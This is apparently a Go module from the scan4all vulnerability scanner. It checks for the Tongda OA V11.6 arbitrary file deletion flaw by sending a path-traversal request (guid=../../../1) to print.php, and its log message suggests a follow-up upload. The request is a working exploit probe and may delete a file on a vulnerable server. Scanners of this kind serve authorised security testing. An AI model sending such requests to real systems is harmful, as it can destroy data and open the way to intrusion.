package tongda

import (
	"github.com/GhostTroops/scan4all/lib/util"
	"strings"
)

// version 通达 OA V11.6 任意文件删除
func File_delete(url string) bool {
	if req, err := util.HttpRequset(url+"/module/appbuilder/assets/print.php?guid=../../../1", "GET", "", false, nil); err == nil {
		if strings.Contains(req.Body, "未知参数") {
			util.SendLog(req.RequestUrl, "File_upload", "Found tongda-OA file delete in print.php you can try to upload", "")
			return true
		}
	}
	return false
}
